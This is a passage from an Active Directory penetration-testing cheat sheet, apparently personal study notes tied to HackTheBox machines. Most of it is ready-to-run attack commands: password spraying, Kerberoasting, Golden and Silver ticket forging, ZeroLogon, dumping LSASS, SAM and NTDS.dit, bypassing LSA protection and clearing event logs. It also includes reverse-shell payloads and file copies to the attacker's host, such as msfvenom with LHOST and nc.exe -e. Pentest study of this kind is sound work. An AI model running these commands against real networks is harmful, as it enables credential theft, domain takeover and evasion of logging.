										Whereas, 'Kerbrute' has enhanced functionality, is written in Go and is provided by ropnop(Ronnie Flathers)
								Installation:
									https://github.com/ropnop/kerbrute/releases
								Usage:
									Modes:(3)
										A. UserEnum:(verifying valid users)
											kerbrute userenum --dc ip -d domain.local -t 200 user.txt
												Getting output in proper form:
													copy output to kerb.out
													grep VALID kerb.out | awk '{print $7}'
										B. BruteUser:(Test passwords against a single user)
											kerbrute bruteuser --dc ip -d domain.local -t 200 pass.txt user1234
										C. PasswordSpray:(Test a password against many users)
											kerbrute passwordspray --dc ip -d domain.local -t 200 user.txt password1234
									Flags:
										-d => domain_name.local
										--dc <ip>
										-users user.txt
										-passwords pass.txt
										-t => threads
									Note:
										For users.txt => Read "Password Spray" Section
						2. Bruteforcing users using hashes:
							pyKerbrute:(https://github.com/3gstudent/pyKerbrute.git)
								Basics:
									It is based on kerbrute and it can bruteforce users using hashes, which kerbrute cannot.
									Issue => python2
								Usage:
									python2 ./ADPwdSpray.py ip domain.local users.txt ntlmhash <hash> <mode>
									Mode:
										TCP
										UDP
			Type-2: Attacking Service Ticket:
				B. Kerberoasting:(Cracking Service Tickets)
					Basics:
						We use credentials of some domain user to request Service Ticket from TGS(KDC). Since the Service Ticket is encrypted using NTLM hash of Service Account, we crack the Service Ticket to gain hash of the Service Account.
					Exploitation:
						Step-1: Grab Service Ticket Hash:
							A. Remotely:(Via Kali)
								getuserspns.py:(Impacket)
									Usage:
										getuserspns.py domain_name/user:'password' -dc-ip <ip> -request => gives Service_Ticket.kirbi for all Service Accounts
										getuserspns.py domain_name/user -hashes <LM>:<NT> -dc-ip <ip> -request => passing user's hash instead of password
										getuserspns.py domain_name/user -dc-ip <ip> -request
										FLags:
											-dc-ip => DC IP
											-request => request TGS for users
											-outputfile => save output in a file
							B. Locally:(On Victim)
								1. Using mimikatz:
									kerberos::list => List all user tickets (both TGT and TGS) in user memory
									kerberos::list /export => export user tickets to .kirbi files
										we should use "sekurlsa::tickets /export" instead of this as there are circumstances where the user certificates won’t export
									move .kirbi file to kali
									Note:
										Read Mimikitaz section for more details
								2. Using Rubeus:
									Rubeus.exe Kerberoast /outfile:hash.txt
									Note:
										To know more about Rubeus, Read Rubeus Section
						Step-2: Cracking Service Ticket:
							A. Hashcat:
								hashcat -m 13100 hash.txt rockyou.txt
							B. John:
								kirbi2jhon ticket.kirbi > kerb.john
								john --format=krb5tgs --wordlist=rockyou.txt kerb.john
							C. tgsrepcrack.py:(https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)
								Usage:
									./tgsrepcrack.py rockyou.txt file.kirbi
			Type-3: Attacking TGT:
				C. MS14-068:(aka Microsoft Kerberos Checksum Validation Vulnerability)
					Basics:
						It allows any domain user to become a domain admin.
						Basically, KDC would accept any checksum to authenticate the validity of PAC(inside TGT) instead of 3 signatures as specified by MS-PAC. Because of this, An Attacker (an user) can forge a fake PAC and in that PAC, an attacker can add "Domain Administartors" in list of group memberships. When such a PAC reaches AS(KDC), the KDC thinks that the user is a Domain Admin.
						However, in order to actually put the Forged PAC into TGT, we require Password Hash of any Domain Account.
						Used in HTB::Mantis
					Requirements:
						1. Password of any domain account
						2. This attack only works in Windows Server 2008 R2 and earlier.
					To check if DC is vulnerable to MS14-068:
						FindSMB2UPTime.py:(https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py)
							Basics:
								This script performs basic vulnerability detection by checking the uptime of the server to see if it has been rebooted since the patch was released.
							Usage:
								FindSMB2UPTime.py <ip>
							Note:
								This script can yield false negatives as a DC may have been rebooted without the patch having been applied.
					Exploitation:
						Step-1: Edit /etc/hosts:
							ip FQDN_Of_DC domain_name.local
						Step-2:
							goldenpac.py:(Impacket)
								Basics:
									Goldenpac.py makes exploitation easier by performing it automatically for you.
									Once a TGT containing a forged PAC has been created, it is used to create a SMB connection to DC and PsExec is used to gain shell as a Domain Admin
								Usage:
									goldenPac.py domain.local/user:pass@dc.domain.local
				D. Golden Ticket:(Forging TGT)
					Basics:
						We forge a TGT by compromising KRBTGT Account(Getting KRBTGT Account Hash).
						We Pass that forged Ticket to ourselves and gain privileges with which the TGT was created.(via Impersonation)
						Terms:
							Golden Ticket:
								It refers to the forged TGT. A forged TGT is called golden because a TGT(forged or real) can get us any TGS
					Requirements:(1)
						1. Domain SID:
							Step-1: Grab Current User SID:
								CMD> whoami /user => gives SID of Current User
							Step-2: Edit Current User SID to get Domain SID:
								Example:
									S-1-5-21-4254423774-1266059056-3197185112-1001
										Domain SID => S-1-5-21-4254423774-1266059056-3197185112
										RID => 1001
						2. KRBTGT Account Password Hash
					Exploitation:(2 Ways)
						A. Using mimikatz:(We need ADMIN shell on DC)
							Step-1: Obtaining NTLM Hash of KRBTGT Account:(2 Ways)
								A. Using DCSYNC Sub-Module:
									lsadump::dcsync /domain:domain.local /user:krbtgt
									This technique is less noisy as it doesn’t require direct access to the DC
								B. Using LSA Sub-Module:
									lsadump::lsa /inject /name:krbtgt
							Step-2:(2 Ways)
								A. Creating Golden Ticket and saving it to do PTT later on:
									1. Creating Golden Ticket:
										kerberos::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500 /ticket:ticket.kirbi => This will create a Golden ticket as "ticket.kirbi"
										Flags:
											/id:<RID> => This flag decides that "privileges of which user" will the TGT will impersonate.
									2. Loading Golden Ticket into the Memory of Current User:(Pass The Ticket)
										Read Step-2 of PTT Attack
								B. Creating Golden Ticket and doing PTT:
									kerberos::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500 /ptt
							Note:	
								Read mimikitaz Section for more details
						B. Using meterpreter:
							load kiwi
								dcsync_ntlm krbtgt
									it will give sid and NTLM
								golden_ticket_create -d domain.local -u user -s sid -k ntlm -t ticket.kirbi
									Created a Golden ticket
								kerberos_ticket_use ticket.kirbi
									Using the golden ticket in current session
				E. PTT:(Pass The Ticket)(Passing TGT for Lateral Movement)
					Basics:
						We extract TGT from LSASS process(Tickets are stored and handled by LSASS process).
						We use this stolen/extracted TGT to impersonate the privileges which that TGT holds.
					Exploitation:
						Using Mimikatz:(we need admin shell on DC)
							Step-1: Extracting TGT from Victim:(Harvesting Tickets)
								sekurlsa::tickets => List all Tickets (both TGT and TGS) in user's memory
								sekurlsa::tickets /export => Export all Tickets to .kirbi format
								Note:
									We can also use Kerberos module of Mimikatz to do the same, but it is not recommended as there are circumstances where the user certificates won’t export
										kerberos::list => List all Tickets (both TGT and TGS) in user's memory
										kerberos::list /export => Export all Tickets to .kirbi format
							Step-2: Passing The Ticket to gain access:
								A. Remotely:(Via Kali)
									Step-1: Import TGT to kali
										export KRB5CCNAME=/tmp/ticket.kirbi
									Step-2: Get Shell:
										psexec.py domain_name/username -k -no-pass
								B. Locally:(On Victim)
									kerberos::ptt ticket_name.kirbi => It loads the in the current session
									misc::cmd => Shell for current session
							Note:
								Read mimikitaz Section for more details
				F. OPTH:(OverPass The Hash)(Doing PTH To Gain TGT)
					Basics:
						OPTH:
							In this attack, Attacker uses NTLM Hash or AES Key of victim(user or service account) to authenciate KDC on behalf of the victim to recieve a Kerberos Ticke(either TGT or Service Ticket). The Attacker can use that ticket to access other resources in the network.
							"Over" in "OverPass The Hash" Attack refers to taking "Pass The Hash" attack one step further to acquire a valid Kerberos Ticket
						Difference in OPTH and PTH:
							PTH is used to gain access network resources by using Hash
							OPTH is used to generate Kerberos Ticket(either TGT or Service Ticket) which can be lateron used to gain access of other network resources
					Requirements:
						We need NTLM Hash or AES Key of victim:
							Using Mimikatz:
								sekurlsa::ekeys => Dumps NTLM Hash and AES Keys
								Note:
									We can do this on either client machine or DC
					Exploitation:
						A. Remotely:(Via Kali)
							Step-1: Requesting TGT:
								getTGT.py:(Impacket)
									Basics:
										Using NTLM Hash or AES Key, It requests a TGT and saves it in .ccache format
									Usage:
										getTGT.py -dc-ip 192.168.1.105 -hashes :NT_Hash domain_name.local/user_name
										getTGT.py -dc-ip 192.168.1.105 -aeskey <AES_Key> domain_name.local/user_name
										Flags:
											-dc-ip => IP of Domain Controller
											-hashes => NTLM Hash
											-aeskey => AES Key
							Step-2: PTK:
								Read PTK Section in Lateral Movement Section
						B. Locally:(On Victim)(2 ways)
							A. Using Mimikatz:
								Sekurlsa::pth /user:any_name /domain:domain.local /aes256:AES256_hash /ntlm:ntlm_hash
									This will use hash to create Kerberos Ticket and also load that into memory of current user, thus giving the current user privileges of victim account
							B. Using Rubeus:
								Rubeus.exe asktgt /domain:domain_name.local /user:any_name /rc4:NTLM_hash /ptt
								Note:
									To know more about Rubeus, Read Rubeus Section
				G. PTC:(Pass The Cache)
					Basics:
						This technique allows an attacker to take CCACHE File(Kerberos Credentials Cache)(TGT) compromised from some user and replay them on Windows systems within an AD Domain.
						Difference between OPTH and PTC:
							IN OPTH, we use sekurlsa::pth
							IN PTC, we use Kerberos::ptc
					Exploitation:
						Step-1: Obtaining CCACHE File:
							getTGT.py:(Impacket)
								Read Step-1 of OPTH Exploitation Section above
						Step-2: Passing CCACHE File:
							Remotely:(Via Kali)
								Read PTK Section in Lateral Movement Section
							Locally:(On Victim)
								Using Mimikatz:
									kerberos::ptc <ticket_name.ccache> => Injects the specified ccache file into memory of current user
			Type-4: Attacking TGS:
				H. Silver Ticket:(Forging TGS)
					Basics:
						Attacker forges TGS Ticket using Service Account password hash and then uses that Forged TGS Ticket for further exploitation.
						No intermediary TGT is needed, it means that Silver Ticket can be forged without any communication with DC
						Terms:
							Silver Ticket:
					Requirement:
						NTLM Hash of Service Account
					Exploitation:
						Step-1: Forge The TGS Ticket:
							Using Mimikatz:(We need ADMIN shell on DC)
								kerberos::golden /domain:domain.local /sid:domain_sid /target:service_host:port /service:service_name /rc4:NTLM /user:user1234 /ptt
								Note:
									Read mimikitaz Section for more details
						Step-2: Using the Forged TGS Ticket for further exploitation:
							This depends on which Service Account's TGS we have forged.
							Read the following link for Service Account-Specific Exploitation:
								https://pentest.racko.sk/active-directory/persistence/silver-ticket
		Token Impersonation:(aka Token Theft)
			Basics:
				Note:
					Token Impersonation is a type of Token Manipultaion
					For Token Manipultaion => Read Windows Privesc Sheet
				Requirements:
					1. We must be a local admin
				Its used to impersonate another user logged on to a system.
				This is very useful in scenarios where you are local admin on a machine and want to impersonate another logged on user, e.g a domain administrator.
			Exploitation:
				Manual:
					Invoke-TokenManipulation.ps1:(https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)
						Requirements:
							We must
						Usage:
							Invoke-TokenManipulation.ps1 -Enumerate => Enumerates the "Impersonation Tokens" currently availabel
							Invoke-TokenManipulation.ps1 -ImpersonateUser -UserName "domain\user_name" => to impersonate domain user account
							Invoke-TokenManipulation.ps1 -ImpersonateUser -UserName "NT AUTHORITY\SYSTEM" => to impersonate SYSTEM (local account)
							Invoke-TokenManipulation.ps1 –CreateProcess “c:\temp\nc.exe -e powershell.exe my_ip 443” –Username "NT AUTHORITY\SYSTEM"
							Flags:
						Note:
							Dont go at the name.
							Invoke-TokenManipulation.ps1 is for Token Impersonation.
				Automated:
					MSF:(Meterpreter)
						load incognito => a module foe token exploitaion and impersonation
						list_tokens -u => lists the available tokens
						Impersonate_token "token_name" => it will impersonate the specified token 	
		MS-RPRN Printer Bug:(Attack vector related to NTLM relaying and Printer Exploitation)
			https://luemmelsec.github.io/Relaying-101/
			https://snovvcrash.rocks/2020/12/28/htb-hades.html
		GPP:(MS14-025)
			Basics:
				It allowed admins to create Domain Policies using embedded credentials. These credentials were encrypted using a secret key(AES Key) and placed in "cPASSWORD" file in Groups.xml. Groups.xml can be read by can user.
					\\[Domain Controller]\SYSVOL\[Domain]\Policies\Groups.xml
				However, the secret key was accidentaly released in 2014 by Microsoft publicly.
				It was patched in 2014, but still can be used against server 2012.
			Exploitation:
				A. Metasploit:
					use auxiliary/scanner/smb/smb-enum_gpp
						set rhosts
						set smbuser
						set smbpass
						exploit
					use post/windows/gather/crentials/gpp
						set session <id>
						exploit
				B. GPP-Decrypt:(apt-get install gpp-decrypt)
					download group.xml from victim
					open it and copy encrypted password
					$ gpp-decrypt password			
		ZeroLogon:(CVE-2020-1472)
			Basics:
				This vulnerablity makes every password in dc an empty string, which means "no password", hence "ZeroLogon"
			Exploitation:
				A. Remotely:(Via Kali)
					set_empty_pw.py:(https://github.com/risksense/zerologon)
						Installation:
							pip3 install -r requirements.txt
							Latest version of Impacket:
								apt remove --purge impacket-scripts python3-impacket apt autoremove
								git clone https://github.com/rthalley/dnspython.git 
									sudo python3 setup.py install 
								git clone https://github.com/SecureAuthCorp/impacket.git 
									sudo python3 setup.py install 
						Usage:
							python3 set_empty_pw.py domain.local dc_ip => makes password empty string
							python3 secretsdump.py -just-dc domain/hostname\$@ip => give me domain admin hash
							wmiexec.py domain/Administrator@ip -hashes hash
				B. Locally:(On Victim)
					Invoke-ZeroLogon.ps1:(https://github.com/BC-SECURITY/Invoke-ZeroLogon)
						Usage:
							PS>
		Abusing special groups to privesc:
			Abusing DNSAdmins group privileges to get SYSTEM on DC:(used in HTB::Resolute)
				Basics:
					DNSAdmins is a group in AD. Any user can be a part of DNSAdmins and that user can load a DLL file (as a plugin) into the DNS service using dnscmd command. Please note that the DLL is added into DC directly by using dnscmd command.
				Requirements:
					User must be a part of DNSAdmins group
				We will build a DLL which contains reverse tcp code and inject it into dns.exe process on the victim’s DNS Server (DC)
				Creating a dll payload:	
					msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o shell.dll
					Note:
						For more info on making dll payload => Read "Windows Payloads" Section in Windows Privesc Sheet
				Using dnscmd.exe to inject the dll:
					Basics:
						dnscmd.exe is a windows utility that allows users with DnsAdmins privileges manage the DNS server.
					Usage:
						we ask the victim to load our malicious DLL when the service(dns) starts/restarts
						If we dont have a shell on DC:
							PS> dnscmd.exe FQDN /config /serverlevelplugindll //kali_ip/abcd/shell.dll
								FQDN =>	Fully Qualified Domain Name => Read Basics Section at top
						If we have a shell on DC:
							PS> dnscmd.exe /config /serverlevelplugindll //kali_ip/abcd/shell.dll
				To check if the DLL is loaded:
					PS> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
					Note:
						We can only check this if we have a shell on DC.
				Restarting the service manually:
					sc.exe \\FQDN stop dns
					sc.exe \\FQDN start dns
						FQDN =>	Fully Qualified Domain Name => Read Basics Section at top
					Note:
						Read "To start/stop a service" Section of Windows Privesc Sheet to know other ways to start/stop a service
				Getting the shell back:
					rlwrap -r nc -nvlp 443	
			Absuing AD RecycleBin group to view deleted AD Objects:(used in HTB::Cascade)
				Basics:
					This group gives you permission to read deleted AD object. Something juicy information can be found in there
				Exploitation:
					Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
		Abusing Privileges:
			Abusing Privileges which are NOT DOMAIN related: Read Windows Privesc Sheet
			Abusing Privileges which are DOMAIN related:
				Abusing SeLoadDriverPrivilege:(Used in HTB::Fuse)
					Basics:
						It allows to load and unload device drivers.
					Requirements:
						user should have "SeLoadDriverPrivilege" privilege
							whoami /priv
		Abusing ACL/ACE:(Access Control Lists/Access Control Enteries)
			WriteDACL:(Write Permissions for Discrietionary Access Control List)
				If a user has DACL write permissions, then the user can grant himself any privileges he want
				We want to grant dcsync rights to user as dcsync rights makes user act as DC admin
				powerview.ps1:
					. ./powerview.ps1
					$pass = Convertto-securestring 'password' -AsPlainText -Force 
					$cred = New-Object System.Management.Automation.PSCredential('domain\username'.$pass)
					Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity username -Rights DCSync
		Mining Credentials and Finding Juicy Files:
			Basics:
				LSA: Read Windows Internals Sheet
				LSASS: Read Windows Internals Sheet
				NTDS.dit: Read Windows Internals Sheet
				SAM: Read Windows Internals Sheet
				Windows Vault: Read Windows Internals Sheet			
			Dumping NTDS.dit:(DCSYNC Attack)
				Basics:
					Even with administrator rights , we cannot read from the domain controller C:\Windows\NTDS\ntds.dit file.
				used in HTB::sauna,HTB::Sizzle
				To grab ntds.dit file:
					ntdsutil:
						This will help us to get ntds.dit file
						PS> ntdsutil snapshot "activate instance ntds" create quit quit => this will give us a value 
						PS> ntdsutil snapshot "mount {value}" quit quit => this will create a mount directory with a random name
						PS> copy C:\$dir_name$\windows\NTDS\ntds.dit \\my_ip\\abcd\ntds.dit => got ntds.dit
						PS> ntdsutil snapshot "unmount {value}" quit quit => cleaning up
						PS> ntdsutil snapshot "delete {b425cef1-c73c-4be5-ad86-522c27a18180}" quit quit => cleaning up
					diskshadow:
						create command.txt and save it as c:\command.txt:
							set context persistent nowriters 
							add volume c: alias someAlias 
							create 
							expose %someAlias% z: 
						CMD> diskshadow /s C:\command.txt
						CMD> j:
						CMD> copy \windows\ntds\ntds.dit \\my_ip\abcd\ntds.dit
					Copy-VSS.ps1:(nishang)(most easy)
						https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1
						PS> . ./Copy-VSS.ps1
						PS> Copy-VSS -DestinationDir C:\temp
						This will give me SAM/System/NTDS
				To get hashes from ntds.dit file:
					crackmapexec:
						crackmapexec smb 192.168.1.1 -u admin -p 'P@ssword' --ntds
						crackmapexec smb 192.168.1.1 -u admin -p 'P@ssword' --ntds drsuapi => via drsuapi method
						crackmapexec smb 192.168.1.1 -u admin -p 'P@ssword' --ntds vss => via vss method
						Note:
							to read more about crackmapexec, read below
					Secretsdump.py:
						Basics:
							dumps hashes of SAM/LSA/DPAPI/other stuff
						Usage:
							A. Remotely:(Via Kali)
								Secretsdump.py domain/user@ip -hashes hash => using lm hash
								secretsdump.py domain/user:pass@ip => using pass
								Note:
									we need admin creds to dump ntds.dit
							B. Locally:(On Victim)
								Requirements:
									ntds.dit and SYSTEM file (in case of AD)
								secretsdump.py -system SYSTEM -ntds ntds.dit local
					mimikatz:
						lsadump::dcsync /domain:domain.local /local /all /csv  => to dump hashes of ntds.dit into a csv file
						Note:
							to read more about mimikatz, read below
			Dumping SAM file:
				To grab SAM file:
					dumping windows hashes using registery hives:
						CMD> mkdir temp
						CMD> reg.exe save hklm\sam c:\temp\sam.save
						CMD> reg.exe save hklm\security c:\temp\security.save
						CMD> reg.exe save hklm\system c:\temp\system.save
						tranfer these using smbserver
					Copy-VSS.ps1:(nishang)(most easy)
						https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1
						PS> . ./Copy-VSS.ps1
						PS> Copy-VSS -DestinationDir C:\temp
						This will give me SAM/System/NTDS
				Dumping SAM hashes:
					A. by using sam file:
						secretsdump.py -sam sam.save -security security.save -system system.save LOCAL => gives ntlm hashes
						samdump2 SYSTEM SAM
					B. Locally:(On Victim)
						mimikatz.exe: Shown below
					C. Remotely:(Via Kali)
						crackmapexec smb 192.168.1.1 -u admin -p 'P@ssword' --sam
			Dumping LSASS file:
				To grab LSASS file:
					Procdump.exe:(sysinternals tool)
						Its used to dump processes in memory, Services like FTP have credentials in clear text in memory. So, we can dump memory and read the credentials.
						procdump.exe -accepteula -ma lsass.exe lsass.dmp
					LsassSilentProcessExit.exe:(https://github.com/deepinstinct/LsassSilentProcessExit.git)
						It dumps LSASS via SilentProcessExit. This method hasnt been yet integrated to mimikatz.exe.(4th June 2021)
						Usage:
							LsassSilentProcessExit.exe <PID of LSASS.exe> <DumpMode>
							DumpMode:
								0 => Call RtlSilentProcessExit on LSASS process handle
								1 => Call CreateRemoteThread on RtlSilentProcessExit on LSASS
					mimikatz.exe: Shown below
				Extracting hashes from LSASS:
					A. Locally:(on Victim)
						pypykatz:(Mimikatz implementation in pure Python)						
							pypykatz lsa minidump lsass.dmp
							Note:
								To read more about pypykatz, read under mimikatz section.
					B. Remotely:(Via Kali)
						lsassy:(python3 -m pip install lsassy)
							lsassy -u user -p password ip --format none --outfile credentials.txt => save creds
							lsassy -u user -p password ip --format pretty
							lsassy -d domain -u user -p password ip --format pretty
							lsassy -d domain -u user -p password targets.txt --format pretty
							lsassy -d domain -u user -H LM:NT targets.txt --format pretty
							Using kerberos ticket:
								export KRB5CCNAME="/home/pixis/jsnow.ccache"
								lsassy -k ip --format pretty
						crackmapexec:
							crackmapexec smb 192.168.255.131 -u administrator -p pass -M lsassy -o REMOTE_LSASS_DUMP=LSASSY_DUMP.dmp
					Lets say we get some error that we cannot dump LSASS file in mimikatz/procdump/etc:
						Reason:
							LSA Protection (aka RunAsPPL) is enabled. PPL(Protected Process Light) was introduced in Windows 8.1 .
						Bypass-1:
							mimikatz# !+
							mimikatz# !processprotect /process:lsass.exe /remove
							mimikatz# privilege::debug
							mimikatz# sekurlsa::logonpasswords
							Note:
								It may fail bcoz of AV.
						Bypass-2:
							PPLKiller:(https://github.com/RedCursorSecurityConsulting/PPLKiller.git)
								Usage:
									cmd>PPLKiller.exe /installDriver
									cmd>PPLKiller.exe /disableLSAProtection
								Now, try to run mimikatz sekurlsa module again.
							PPLdump:(https://github.com/itm4n/PPLdump.git)
								The tool PPLdump, which can disable LSA Protection without loading a driver, could still be used, unlike PPLKiller
								Usage:
									ppldump.exe -v lsass lsass.dmp
			Dumping Stored Credentials from memory:
				Invoke-mimikittenz.ps1:(https://github.com/orlyjamie/mimikittenz/raw/master/Invoke-mimikittenz.ps1)
					It do not grab windows creds. Instead it will grab creds such as that of gmail from memory. Read its github page to know more about what all it grabs.
					Usage:
						. .\Invoke-mimikittenz.ps1
				WCE:(Windows Credential Editor)
					Windows Credentials Editor supports Windows XP, 2003, Vista, 7 and 2008.
					It allows to list windows logon sessions and add/delete/change/list associated crentials(LM/NT hash,kerberos tickets, passwords). It do not dump LSASS file.
					wce -l => list logon sessions and hashes
					wce -w => to dump clear text passwords
					issue:
						can easily invoke antivirus/windows_defender
					Note:
						we need admin privileges to run both WCE
			Dumping Stored Credentials from Disk:(Looking for passwords in the registry/files/etc)(important)
				Manual:(Important)
					Using Files:
						dir /s *pass* == *cred* == *vnc* == *.config*
						dir /b /s unattend.xml
						dir /b /s web.config
						dir /b /s sysprep.inf
						dir /b /s sysprep.xml
						dir /b /s *pass*
						dir /b /s vnc.ini
						Other Juicy Files:
							C:\unattend.xml
							C:\sysprep.inf
							C:\sysprep\sysprep.xml
							C:\Windows\system32\sysprep.inf
							C:\Windows\system32\sysprep\sysprep.xml
							%WINDIR%\Panther\Unattend\Unattended.xml
							%WINDIR%\Panther\Unattended.xml 
							C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
						Searching Files:
							findstr /i password *.ext1 *.ext2
							Extensions:
								.install
								.backup
								.bak
								.log
								.bat
								.cmd
								.vbs
								.ps1
								.cnf
								.conf
								.config
								.ini
								.xml
								.txt
								.gpg
								.pgp
								.p12
								.der
								.csr
								.cer
								.id_rsa
								.id_dsa
								.key
								.ovpn
								.vnc
								.ftp
								.ssh
								.git
								.kdbx
								.db
								.doc
								.docx
								.xls
								.xlsx
					Using Registry:
						reg query HKLM /f password /t REG_SZ /s
						reg query HKCU /f password /t REG_SZ /s
						reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
						reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
						reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
						reg query "HKCU\Software\ORL\WinVNC3\Password"
						reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
						SSH keys:	
							SSH private keys can be stored inside the registry key "HKCU\Software\OpenSSH\Agent\Keys"
							reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
							once found, they can be decrypted using:
								https://github.com/ropnop/windows_sshagent_extract
				Automated:
					Powersploit:
						Get-UnattendedInstallFile
						Get-Webconfig
						Get-ApplicationHost
						Get-SiteListPassword
						Get-CachedGPPPassword
						Get-RegistryAutoLogon
				Note:
					output of automated scripts will show this too
			Mimikatz:
				Basics:
					It is used to grab passwords from memory, dump SAM/NTDS/LSASS and exploit kerberos authenciation
				Mimikatz.exe:(https://github.com/gentilkiwi/mimikatz/releases)
					General Commands:
						privilege::debug => To enable Administrator privileges
						token::elevate => To enable SYSTEM privileges
					Mimikatz Modules:(4)
						1. LSADUMP Module:
							Basics:
								It interacts with the Windows LSA (not LSASS) to extract credentials.
							Sub-Modules:
								A. lsadump::sam
									dumps SAM
								B. lsadump::dcsync
									lsadump::dcsync /domain:domain.local /local /all /csv
										To dump hashes of ntds.dit into a csv file
									lsadump::dcsync /domain:domain.local /user:user_name_or_id
										To get NTLM Hash of user using ntds.dit
								C. lsadump::lsa
									lsadump::lsa /inject /name:user_name => to get NTLM Hash of user
									Flags:
										/inject => Inject LSASS to extract everything
										/patch => extracts only NTLM Hashes
						2. SEKURLSA Module:
							Basics:
								It extracts passwords, keys, pin codes, tickets from the memory of LSASS	
							Sub-Modules:
								A. sekurlsa::minidump
									sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp => dump LSASS
									Covered above "how to extract hashes from lsass.dmp"
								B. sekurlsa::logonPasswords
									sekurlsa::logonPasswords full => to dump the credentials of all logged-on users
								C. sekurlsa::ekeys => Dumps NTLM Hash and AES Keys
								D. sekurlsa::tickets
									sekurlsa::tickets
										Lists Kerberos tickets for all authenticated users, including services running under the context of a user account
									sekurlsa::tickets /export
										Export tickets in .kirbi format
								E. sekurlsa::pth => Pass-The-Hash and OverPass-The-Hash
									sekurlsa::pth /user:user /domain:domain.local /ntlm:hash /run:command => Runs a command after PTH
									Flags:
										/domain => FQDN(Fully Qualified Domain Name => Read Basics Section at top)
										/ntlm => NTLM Hash of user
										/rc4 => same as /ntlm
										/aes128 => AES128 Key of user
										/aes256 => AES256 Key of user
										/run:<command> => runs a command
											command can be "C:\WINDOWS\system32\cmd.exe ./shell.exe" => resulting in reverse shell as SYSTEM
								Note:
									If we get "kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0xvalue)" Error:
										Read "Extracting hashes from LSASS" section
						3. KERBEROS Module:
							Basics:
								Its used to interact with official Microsoft Kerberos API. It dont require privileges.
							Sub-Modules:
								A. kerberos::list
									kerberos::list => List all user tickets (both TGT and TGS) in user memory
									kerberos::list /export => Export user tickets to .kirbi files
									Note:
										we should use "sekurlsa::tickets /export" instead of this as there are circumstances where the user certificates won’t export
								B. kerberos::ptt => Pass The Ticket
									kerberos::ptt ticket.kirbi
								C. Kerberos::ptc => Pass The Cache
									kerberos::ptc <ticket_name.ccache> => Injects the specified ccache file into memory of current user
								D. kerberos::golden
									kerberos::golden
										Create golden/silver/trust tickets
									kerberos::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500 /ticket:ticket.kirbi
										Creates a Golden Ticket "ticket.kirbi"
									kerberos::golden /domain:domain.local /sid:domain_sid /target:service_host:port /service:service_name /rc4:NTLM /user:user1234 /ptt
										Creates a Silver Ticket "ticket.kirbi"
									Flags:
										/domain => FQDN(Fully Qualified Domain Name => Read Basics Section at top)
										/sid => Domain SID
										/user:
											Name of the user under whose name, we are creating the Ticket.
											It can be anything, it dont need to a real account name.
										/id:
											RID of Account you for which you want to create a Ticket(To impersonate that Account)
											This flag decides that "privileges of which user" will the TGT will impersonate.
											Default value is 500(RID of administrator)
										/ticket => Its optional. Provide a name and path to save the ticket (its an alternative to /ptt)
										/ptt => Its optional. Loads Ticket into memory immediately after creating it (its an alternative to /ticket)
										/rc4:
											In case of Golden Ticket Attack, we pass NTLM hash of KRBTGT Account
											In case of Silver Ticket Attack, we pass NTLM hash of victim Service Account
										/nltm => same as /rc4
										/aed256:
											In case of Golden Ticket Attack, we pass AES-256 Key of KRBTGT Account
											In case of Silver Ticket Attack, we pass AES-256 Key of victim Service Account
										/aes128:
											In case of Golden Ticket Attack, we pass AES-128 Key of KRBTGT Account
											In case of Silver Ticket Attack, we pass AES-128 Key of victim Service Account
									Flags for Silver Ticket Attack:
										/target => target server’s FQDN(Fully Qualified Domain Name => Read Basics Section at top)
										/service => SPN of Service Account which we wish to forge TGS Tickets for
						4. MISC Module:
							Basics:
							Sub-Modules:
								A. misc::skeleton
									Performs the Skeleton Key Attack. After this, we can use default mimikitaz creds(jeff:mimikitaz) for everything/every user.
									Note:
										Read more about Skeleton Key below under persistence section
								B. misc::cmd
						5. EVENT Module:
							Basics:
							Sub-Modules:
								EVENT::Clear => Clear an event log
								EVENT::Drop => Patch event services to avoid new logs
								Note:
									Run event::drop to patch the event log and then run Event::Clear to clear the event log without any log cleared event being logged
					Note:
						Mimikatz.exe is arch-dependent and has two versions available, x86 and x64.
					One-liner for mimikatz.exe:
						It can be used when we have a restricted shell
						.\mimikatz "command1" "command 2" exit
						.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
						Note:
							we used "mimikitaz", not "mimikitaz.exe"
				Invoke-Mimikatz:(/usr/share/nishang/Gather/Invoke-Mimikatz.ps1)
					Basics:
						It is .ps1 implementation of Mimikatz.exe
					Usage:
						Invoke-Mimikatz -DumpCreds => to dump credentials out of LSASS
						Flags:
				pypykatz:(pip3 install pypykatz)
					Basics:
						Mimikatz implementation in python. It is usefull when we wanna use mimikatz to dump hashes locally.
					Usage:
						pypykatz lsa minidump lsass.dmp	
				Note:
					we need admin privileges to run mimikatz
			Rubeus.exe:
				Basics:
				Download:
					https://github.com/GhostPack/Rubeus => actual repo
					https://github.com/r3motecontrol/Ghostpack-CompiledBinaries => to get .exe
				Usage:
					Modules:
						PTT:
							Basics:
							Usage:
								Flags:
						ASKTGT:
							Basics:
								Requests a TGT using hash/key/password or certificate
							Usage:
								Rubeus.exe asktgt /domain:domain_name.local /user:any_name /rc4:NTLM_hash /ptt => Pass The Ticket
